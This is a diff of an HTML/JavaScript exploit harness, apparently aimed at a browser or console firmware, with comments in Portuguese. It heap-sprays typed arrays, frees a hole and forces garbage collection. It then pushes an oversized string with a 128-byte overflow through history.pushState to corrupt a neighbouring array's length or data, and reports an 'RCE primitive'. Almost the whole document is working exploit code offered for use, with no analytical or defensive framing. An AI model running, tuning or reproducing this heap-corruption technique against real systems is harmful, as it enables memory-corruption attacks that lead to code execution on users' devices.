@@ -1,133 +1,221 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Limit Breaker: Precision 1-Byte Overflow</title>
+    <title>Heap Limit Breaker: Aggressive Mode</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .log { border: 1px solid #004400; height: 350px; overflow-y: scroll; padding: 10px; background: #001100; margin-top: 15px; font-size: 14px; }
-        .controls { border: 1px solid #444; padding: 20px; background: #111; margin-bottom: 20px; }
+        body { 
+            background: #050505; 
+            color: #00ff00; 
+            font-family: 'Courier New', monospace; 
+            padding: 20px; 
+        }
+        h1 { margin-bottom: 5px; text-shadow: 0 0 5px #00ff00; }
+        .info { color: #888; font-size: 12px; margin-bottom: 20px; }
+        
+        .log { 
+            border: 2px solid #004400; 
+            height: 400px; 
+            overflow-y: scroll; 
+            padding: 10px; 
+            background: #001100; 
+            margin-top: 15px; 
+            font-size: 14px; 
+            white-space: pre-wrap;
+        }
+        
+        .controls { 
+            border: 1px solid #444; 
+            padding: 15px; 
+            background: #111; 
+            display: flex; 
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        button { 
+            padding: 12px 24px; 
+            font-size: 16px; 
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            cursor: pointer; 
+            background: #222; 
+            color: white; 
+            border: 1px solid #555; 
+            transition: all 0.2s;
+        }
+        button:hover { background: #006600; border-color: #00ff00; }
+        button:active { transform: scale(0.98); }
+        
         .highlight { color: #ffff00; font-weight: bold; }
-        .success { color: #fff; background: #00aa00; padding: 5px; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #222; color: white; border: 1px solid #555; }
-        button:hover { background: #444; }
+        .error { color: #ff3333; font-weight: bold; }
+        .success { 
+            color: #fff; 
+            background: #00aa00; 
+            padding: 2px 5px; 
+            border-radius: 3px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <h1>LIMIT BREAKER: 1-BYTE PRECISION</h1>
-    <p>Payload: 709,522 bytes | Overflow: <span style="color:red">1 byte (0x01)</span></p>
+    <h1>HEAP LIMIT BREAKER: AGGRESSIVE</h1>
+    <p class="info">
+        Base Payload: 709,522 bytes | Overflow: <span style="color:red">128 bytes (Heavy)</span><br>
+        Objetivo: Causar CRASH ou Corrupção visível para confirmar alinhamento.
+    </p>
     
     <div class="controls">
-        <p>Tamanho do Buraco (Blocos de 4KB):</p>
-        <button onclick="runTest(173)">Testar 173 (Apertado)</button>
-        <button onclick="runTest(174)">Testar 174 (Ideal?)</button>
-        <button onclick="runTest(175)">Testar 175 (Folgado)</button>
+        <button onclick="runTest(160)">Hole: 160</button>
+        <button onclick="runTest(168)">Hole: 168</button>
+        <button onclick="runTest(172)">Hole: 172</button>
+        <button onclick="runTest(176)">Hole: 176</button>
+        <button onclick="forceGC()" style="border-color: #aa5500;">Forçar GC</button>
     </div>
 
-    <div id="logger" class="log">Aguardando...</div>
+    <div id="logger" class="log">Sistema pronto. Selecione um tamanho de buraco acima.</div>
 
     <script>
         const logger = document.getElementById('logger');
+        
+        // --- CONFIGURAÇÕES CRÍTICAS ---
+        const PAYLOAD_BASE_SIZE = 709522; // Tamanho base da string (ajustar conforme firmware/exploit)
+        const SPRAY_SIZE = 10000;         // Quantidade de objetos para estabilizar o Heap
+        const SPRAY_CENTER = 5000;        // Onde vamos abrir o buraco
+        const ARRAY_SIZE = 1024;          // Tamanho do Uint32Array (4KB na memória física geralmente)
+        const MAGIC_NUM = 0x41414141;     // "AAAA" para verificação de integridade
+
+        var spray = [];
+
         function log(msg, type='') {
             const d = document.createElement('div');
-            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             if(type) d.className = type;
             logger.appendChild(d);
             logger.scrollTop = logger.scrollHeight;
         }
 
-        const PAYLOAD_BASE = 709522; 
-        const OVERFLOW_BYTES = 1; // Apenas 1 byte para não disparar erro de cota
-
-        var spray = [];
+        function forceGC() {
+            log("Tentando forçar Garbage Collection...", "highlight");
+            try {
+                if(window.gc) { window.gc(); }
+                else {
+                    // Fallback rudimentar para GC
+                    for(let i=0; i<100; i++) new ArrayBuffer(1024 * 1024);
+                }
+                log("GC acionado (esperamos).");
+            } catch(e) { log("Erro no GC: " + e); }
+        }
 
         async function runTest(holeSize) {
-            log("------------------------------------------");
-            log(`INICIANDO: Buraco de ${holeSize} blocos.`, 'highlight');
+            log("==========================================");
+            log(`INICIANDO TESTE - Buraco: ${holeSize}`, 'highlight');
             
-            // 1. Limpa memória
+            // 1. Limpeza
+            log("1. Limpando Heap antigo...");
+            spray = null;
+            await new Promise(r => setTimeout(r, 200));
             spray = [];
+            forceGC();
+            await new Promise(r => setTimeout(r, 500));
             
-            // 2. Spray de Estrutura (Sanduíche)
-            // Vamos fazer um spray alternado para garantir que o vizinho seja um Uint32Array
-            log("1. Alocando estrutura do Heap...");
-            
-            for(let i=0; i < 4000; i++) {
-                let arr = new Uint32Array(1024); // 4096 bytes
-                arr[0] = 0x41414141; // Marker
-                arr[1] = i;          // Index
+            // 2. Heap Spray (Sanduíche)
+            log(`2. Spraying ${SPRAY_SIZE} objetos Uint32Array...`);
+            for(let i=0; i < SPRAY_SIZE; i++) {
+                let arr = new Uint32Array(ARRAY_SIZE); 
+                arr[0] = MAGIC_NUM; // Marcador de integridade
+                arr[1] = i;         // Índice para sabermos quem foi atingido
                 spray.push(arr);
             }
 
-            // 3. Cria o Buraco
-            log(`2. Abrindo buraco de ${holeSize} blocos...`);
-            
-            // Focamos numa área central do Heap (índice 2000)
-            let startIdx = 2000;
+            // 3. Abrindo o Buraco
+            log(`3. Criando buraco de ${holeSize} itens no índice ${SPRAY_CENTER}...`);
             for(let i=0; i < holeSize; i++) {
-                spray[startIdx + i] = null;
+                spray[SPRAY_CENTER + i] = null;
             }
 
-            // Delay para GC
-            log("3. Aguardando alinhamento (GC)...");
-            await new Promise(r => setTimeout(r, 500));
+            // Delay crítico
+            log("4. Aguardando Garbage Collector (1.5s)...", "highlight");
+            await new Promise(r => setTimeout(r, 1500));
 
-            // 4. Injeção Cirúrgica
-            log(`4. Injetando Payload (${PAYLOAD_BASE} + 1 byte)...`);
+            // 4. Injeção
+            log(`5. Injetando Payload (${PAYLOAD_BASE_SIZE}B + 128B Overflow)...`);
             
             try {
-                let base = "A".repeat(PAYLOAD_BASE);
-                // Overflow mínimo. 0x01 é seguro.
-                // Se cair no Header de tamanho, transforma 0x1000 em 0x1001 ou algo maior dependendo do endianness.
-                let overflow = "\x01"; 
+                // Cria a string base ("A"...)
+                // Otimização: Criar em chunks para não travar o browser antes da hora
+                let base = new Array(PAYLOAD_BASE_SIZE + 1).join('A');
                 
-                let payload = "/" + base + overflow; // O "/" inicial ajuda a evitar validação de protocolo
+                // Overflow Agressivo ("B"...)
+                // Se isso acertar o vizinho, vai sobrescrever o Header e os dados.
+                let overflow = new Array(129).join('B'); 
+                
+                let payload = base + overflow; 
 
-                history.pushState({}, "pwn_" + holeSize, payload);
+                // A Mágica: history.pushState
+                // A string 'payload' deve preencher o buraco deixado pelos arrays deletados
+                history.pushState({}, "pwn_" + holeSize + "_" + Date.now(), payload);
                 
-                // 5. Checagem
-                checkCorruption(holeSize, startIdx);
+                log("Payload enviado para a memória.", "highlight");
+                
+                // 5. Verificação
+                checkCorruption(holeSize, SPRAY_CENTER);
 
             } catch(e) {
-                if(e.message.includes("quota") || e.message.includes("allowed")) {
-                    log("ERRO DE COTA: O Payload + Overhead excedeu o limite do browser.", "highlight");
-                    log("Tente um buraco MENOR (ex: " + (holeSize-1) + ") para forçar reuso de memória.");
+                if(e.message.includes("quota")) {
+                    log("ERRO: Payload excede cota do SessionStorage/History.", "error");
                 } else {
-                    log("ERRO GERAL: " + e.message, "highlight");
+                    log("CRASH/ERRO: " + e.message, "error");
                 }
             }
         }
 
         function checkCorruption(holeUsed, startIdx) {
-            log("Verificando vizinhos...");
+            log("6. Verificando vizinhos por danos...", "highlight");
+            
             let found = false;
-            
-            // Verifica os arrays LOGO DEPOIS do buraco
-            // O buraco acaba em startIdx + holeUsed. O próximo array vivo é startIdx + holeUsed.
-            let neighborIdx = startIdx + holeUsed;
-            
-            // Verifica esse vizinho e os próximos 10 (caso o alinhamento tenha variado)
-            for(let i = neighborIdx; i < neighborIdx + 20; i++) {
+            // Verifica os objetos logo após o buraco
+            let searchStart = startIdx + holeUsed;
+            let searchEnd = searchStart + 100; // Verifica os próximos 100 vizinhos (margem de segurança)
+
+            for(let i = searchStart; i < searchEnd; i++) {
+                if (i >= spray.length) break;
+                
                 let arr = spray[i];
+                
                 if(arr) {
-                    // Tamanho original é 1024
-                    if(arr.length !== 1024) {
+                    // CHECAGEM 1: Tamanho (Length Corruption)
+                    if(arr.length !== ARRAY_SIZE) {
                         found = true;
-                        log("!!! SUCESSO ABSOLUTO !!!", "success");
-                        log(`Array vizinho [${i}] foi atingido!`, "success");
-                        log(`Tamanho Original: 1024`, "success");
-                        log(`Novo Tamanho: ${arr.length}`, "success");
-                        document.body.style.background = "#0f0";
-                        alert("RCE FOUND! Hole Size: " + holeUsed);
+                        reportSuccess(i, "LENGTH", arr.length, arr[0]);
+                        return;
+                    }
+
+                    // CHECAGEM 2: Conteúdo (Data Corruption)
+                    if(arr[0] !== MAGIC_NUM) {
+                        found = true;
+                        reportSuccess(i, "CONTENT", arr.length, arr[0]);
                         return;
                     }
                 }
             }
 
             if(!found) {
-                log("Nenhum array vizinho foi alterado.");
-                log("Se não crashou, o byte 0x01 caiu em padding (espaço vazio).");
-                log("Tente reduzir o tamanho do buraco em 1.");
+                log("FALHA: Nenhum vizinho foi afetado.", "error");
+                log("Diagnóstico provável:");
+                log(" - O buraco não foi reutilizado (tamanho errado?)");
+                log(" - O overflow caiu no padding (tente aumentar o overflow)");
             }
+        }
+
+        function reportSuccess(idx, type, len, content) {
+            document.body.style.background = "#003300";
+            log("------------------------------------------");
+            log(`!!! SUCESSO !!! Vizinho [${idx}] atingido!`, "success");
+            log(`Tipo de Corrupção: ${type}`, "success");
+            log(`Novo Length: ${len} (Original: ${ARRAY_SIZE})`, "success");
+            log(`Conteúdo[0]: 0x${content.toString(16)} (Original: 0x41414141)`, "success");
+            log("------------------------------------------");
+            alert(`RCE PRIMITIVE FOUND!\nIndex: ${idx}\nType: ${type}`);
         }
     </script>
 </body>
